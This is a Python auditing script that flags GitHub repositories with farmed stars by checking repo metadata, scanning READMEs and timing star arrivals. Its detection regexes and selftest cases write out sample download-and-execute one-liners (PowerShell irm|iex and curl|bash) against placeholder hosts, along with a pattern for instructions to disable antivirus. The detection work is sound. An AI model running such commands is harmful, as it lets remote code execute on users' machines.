#!/usr/bin/env python3
"""
star_farm_probe.py — audit "fast-rising" GitHub repos for star-farm / payload signatures.

Why: GitHub's search API sorts by star count, and star count is a free-to-manipulate
ranking input. Totals lie. What is expensive to fake is *arrival shape* and *repo
structure consistency*.

Three independent probes (run them separately, they disagree on purpose):
  metadata  repo-level structure: forks==0 with huge stars, created→pushed lag, tree size
  readme    does the README ask you to execute something remote? (with word boundaries)
  events    star arrival shape from /repos/{r}/events WatchEvents

Usage:
  python star_farm_probe.py metadata --days 8 --top 40
  python star_farm_probe.py readme   --days 8 --top 40
  python star_farm_probe.py events   --repos a/b c/d
  python star_farm_probe.py selftest

Requires the `gh` CLI (any authenticated token); no other dependencies.
"""
import argparse
import base64
import collections
import json
import re
import subprocess
import sys
import time

# ---------------------------------------------------------------- regexes
# NAIVE pattern: `irm\s+` looks fine and is wrong. It matches the tail of
# "confirm ", "affirm ", "firm ". On a 40-repo sample this produced 7 hits,
# 7 of which were the word "confirm". Kept here as a live regression case.
NAIVE_PS = re.compile(r"irm\s+|iex\s*\(|Invoke-Expression|Invoke-WebRequest", re.I)

PS_DOWNLOAD_EXEC = re.compile(
    r"(?<![\w-])(irm|iex|Invoke-Expression|Invoke-WebRequest)(?![\w-])", re.I)
CURL_PIPE_SHELL = re.compile(
    r"(?<![\w-])curl\b[^\n|]{0,120}\|\s*(?:sudo\s+)?(?:bash|sh|zsh)\b", re.I)
WGET_PIPE_SHELL = re.compile(
    r"(?<![\w-])wget\b[^\n|]{0,120}\|\s*(?:sudo\s+)?(?:bash|sh)\b", re.I)
DISABLE_AV = re.compile(
    r"(关闭|禁用|disable|turn off).{0,24}(实时防护|杀毒|defender|antivirus|real[\s-]?time)", re.I)
URL_HOST = re.compile(r"https?://([a-zA-Z0-9.\-]+\.[a-z]{2,})", re.I)

PIPELINE_NAMES = ("ps_download_exec", "curl_pipe_shell", "wget_pipe_shell", "disable_av")
PIPELINES = {
    "ps_download_exec": PS_DOWNLOAD_EXEC,
    "curl_pipe_shell": CURL_PIPE_SHELL,
    "wget_pipe_shell": WGET_PIPE_SHELL,
    "disable_av": DISABLE_AV,
}


# ---------------------------------------------------------------- gh helper
def gh(path):
    p = subprocess.run(["gh", "api", path], capture_output=True, text=True,
                       encoding="utf-8", errors="replace")
    if p.returncode != 0:
        raise RuntimeError(f"gh api {path} failed: {(p.stderr or '').strip()[:200]}")
    return json.loads(p.stdout)


def gh_events(repo, pages=3):
    """Events API only exposes ~90 days / max 3 pages of 100. Treat as a rolling window."""
    out = []
    for page in range(1, pages + 1):
        try:
            ev = gh(f"repos/{repo}/events?per_page=100&page={page}")
        except RuntimeError:
            break
        if not ev:
            break
        out.extend(ev)
        if len(ev) < 100:
            break
        time.sleep(0.3)
    return out


def utc_epoch(s):
    return int(time.mktime(time.strptime(s, "%Y-%m-%dT%H:%M:%SZ")))


# ---------------------------------------------------------------- probes
def probe_metadata(days, top):
    res = gh(f"search/repositories?q=created:>%(d)s"
             % {"d": time.strftime("%Y-%m-%d", time.gmtime(time.time() - days * 86400))}
             + f"&sort=stars&order=desc&per_page={top}")
    rows = []
    for r in res["items"]:
        lag = utc_epoch(r["pushed_at"]) - utc_epoch(r["created_at"])
        rows.append({
            "full": r["full_name"], "stars": r["stargazers_count"],
            "forks": r["forks_count"], "size_kb": r["size"],
            "lag_s": lag, "license": (r.get("license") or {}).get("spdx_id"),
            "desc": (r.get("description") or "")[:80],
        })
    n = len(rows)
    fl = {
        "stars>=300 & forks==0": [x["full"] for x in rows if x["stars"] >= 300 and x["forks"] == 0],
        "stars>=300 & created->push<=10s": [x["full"] for x in rows if x["stars"] >= 300 and x["lag_s"] <= 10],
        "forks>stars": [x["full"] for x in rows if x["forks"] > x["stars"]],
        "no license & stars>=300": [x["full"] for x in rows if x["stars"] >= 300 and not x["license"]],
    }
    print(f"sample: {n} repos created in the last {days}d, sorted by stars\n")
    for k, v in fl.items():
        print(f"  {k:38} {len(v):>4}   {', '.join(v[:5])}")
    print()
    for x in rows[:15]:
        print(f"  {x['full'][:44]:44} *{x['stars']:>6} fork{x['forks']:>5} "
              f"{x['size_kb']:>7}KB lag{x['lag_s']:>7}s")
    return rows, fl


def probe_readme(days, top):
    rows = probe_metadata(days, top)[0]
    print("\nREADME scan (naive vs word-boundary regex):\n")
    naive_hits, real_hits = 0, collections.Counter()
    examples, domspam = [], []
    for r in rows:
        try:
            rd = gh(f"repos/{r['full']}/readme")
        except RuntimeError:
            continue
        txt = base64.b64decode(rd["content"]).decode("utf-8", "replace") if rd.get("content") else ""
        m = NAIVE_PS.search(txt)
        if m:
            naive_hits += 1
            examples.append((r["full"], txt[max(0, m.start() - 20):m.end() + 20].replace("\n", " ")))
        for name, rx in PIPELINES.items():
            if rx.search(txt):
                real_hits[name] += 1
                print(f"  HIT {name:18} {r['full']}")
        hosts = collections.Counter(h.lower() for h in URL_HOST.findall(txt))
        if hosts:
            host, cnt = hosts.most_common(1)[0]
            if cnt >= 50:
                domspam.append((r["full"], host, cnt))
        time.sleep(0.15)
    print(f"\n  naive regex hits:        {naive_hits}/{len(rows)}")
    for name in PIPELINE_NAMES:
        print(f"  corrected {name:18} {real_hits[name]}")
    if examples:
        print("\n  what the naive regex matched:")
        for f, ctx in examples:
            print(f"    {f[:38]:38} -> ...{ctx}...")
    if domspam:
        print("\n  READMEs repeating one domain >=50x (self-referential traffic):")
        for f, h, c in sorted(domspam, key=lambda x: -x[2]):
            print(f"    {f[:38]:38} {h:28} x{c}")
    return naive_hits, dict(real_hits), domspam


def probe_events(repos):
    print(f"{'repo':40} {'watch':>6} {'span_h':>7} {'peak/min':>9} {'peak5m%':>8} {'gaps>1h':>8}")
    out = {}
    for repo in repos:
        ev = gh_events(repo)
        ts = sorted(utc_epoch(e["created_at"]) for e in ev if e.get("type") == "WatchEvent")
        if not ts:
            print(f"{repo[:40]:40} {'0':>6}")
            continue
        per_min = collections.Counter(t // 60 for t in ts)
        per_5 = collections.Counter(t // 300 for t in ts)
        span_h = round((ts[-1] - ts[0]) / 3600, 1) if len(ts) > 1 else 0.0
        peak_min, peak_5 = max(per_min.values()), max(per_5.values())
        gaps = sum(1 for a, b in zip(ts, ts[1:]) if b - a > 3600)
        out[repo] = {"watch": len(ts), "span_h": span_h, "peak_min": peak_min,
                     "peak_5": peak_5, "peak5_pct": round(100.0 * peak_5 / len(ts), 1), "gaps_gt_1h": gaps}
        print(f"{repo[:40]:40} {len(ts):>6} {span_h:>7} {peak_min:>9} {peak_5:>8} "
              f"{out[repo]['peak5_pct']:>8} {gaps:>8}")
        time.sleep(0.4)
    print("\nRead it as: farmed stars cluster in a couple of 5-minute buckets")
    print("(peak5m% single digits = spread out, double digits + zero gaps = injected).")
    print("Caveat: /events is a rolling window of the last ~300 events, not full history.")
    return out


# ---------------------------------------------------------------- selftest
SELFTEST_CASES = [
    # (label, text, expected naive hit, expected corrected hit)
    ("prose 'confirm' (the 7/40 false positive)", "Please confirm the backup on the phone.", True, False),
    ("'affirm' inside a word", "they affirm their support", True, False),
    ("real PowerShell one-liner", "powershell -w h irm https://x.tld/a.ps1 | iex", True, True),
    ("real Invoke-WebRequest", "Invoke-WebRequest https://x.tld/i.ps1 | Invoke-Expression", True, True),
    ("plain word 'firm'", "a firm handshake", True, False),
]


def selftest():
    fails = 0
    for label, text, want_naive, want_fixed in SELFTEST_CASES:
        got_naive = bool(NAIVE_PS.search(text))
        got_fixed = bool(PS_DOWNLOAD_EXEC.search(text))
        ok = got_naive == want_naive and got_fixed == want_fixed
        fails += 0 if ok else 1
        print(f"  {'PASS' if ok else 'FAIL'}  naive={got_naive!s:5} fixed={got_fixed!s:5}  {label}")

    pipe_cases = [
        ("real curl|bash", "curl -fsSL https://x.tld/i.sh | bash", True),
        ("curl in prose with pipe to bash word", "pipe the curl output, then bash it", False),
        ("curl with -o (download, not exec)", "curl -o out.tar.gz https://x.tld/a.tar.gz", False),
    ]
    for label, text, want in pipe_cases:
        got = bool(CURL_PIPE_SHELL.search(text))
        ok = got == want
        fails += 0 if ok else 1
        print(f"  {'PASS' if ok else 'FAIL'}  curl_pipe={got!s:5}  {label}")

    av = DISABLE_AV.search("请先关闭实时防护再运行")
    ok = bool(av)
    fails += 0 if ok else 1
    print(f"  {'PASS' if ok else 'FAIL'}  disable_av matched Chinese instruction")

    dom = URL_HOST.findall("see https://lab.example.app/x and https://lab.example.app/y")
    ok = len(dom) == 2
    fails += 0 if ok else 1
    print(f"  {'PASS' if ok else 'FAIL'}  URL_HOST counts repeats ({len(dom)}/2)")

    print(f"\n{len(SELFTEST_CASES) + 5 - fails}/{len(SELFTEST_CASES) + 5} passed")
    return 0 if fails == 0 else 1


# ---------------------------------------------------------------- main
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("mode", choices=["metadata", "readme", "events", "selftest"])
    ap.add_argument("--days", type=int, default=8)
    ap.add_argument("--top", type=int, default=40)
    ap.add_argument("--repos", nargs="*", default=[])
    ap.add_argument("--json", help="write raw numbers here")
    a = ap.parse_args()

    if a.mode == "selftest":
        return selftest()
    if a.mode == "metadata":
        rows, fl = probe_metadata(a.days, a.top)
        payload = {"rows": rows, "flags": fl}
    elif a.mode == "readme":
        naive, real, domspam = probe_readme(a.days, a.top)
        payload = {"naive_hits": naive, "corrected": real, "domspam": domspam}
    else:
        if not a.repos:
            print("events mode needs --repos", file=sys.stderr)
            return 2
        payload = probe_events(a.repos)
    if a.json:
        with open(a.json, "w", encoding="utf-8") as fh:
            json.dump(payload, fh, ensure_ascii=False, indent=1)
        print(f"\nwrote {a.json}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
